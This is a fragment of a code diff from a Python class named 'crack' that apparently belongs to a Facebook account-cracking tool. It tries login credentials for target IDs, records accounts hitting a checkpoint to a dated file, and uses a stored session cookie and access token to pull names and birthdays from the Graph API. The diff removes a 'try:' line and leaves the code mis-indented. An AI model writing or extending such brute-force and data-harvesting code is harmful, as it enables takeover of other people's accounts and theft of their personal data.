@@ -1435,7 +1435,6 @@ class crack:
                 elif sistem_login == 'tiga' : log = logger3(id,pw)
                 else:log = logger1(id,pw)
                 if log['status'] == 'cp':files_cp = "CP/%s.json"%(tanggal)
-        try:
           with requests.Session() as xyz:cookie = {'cookie':open('login/cookie.json','r').read()}
           url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
           req = xyz.get(url,cookies=cookie)
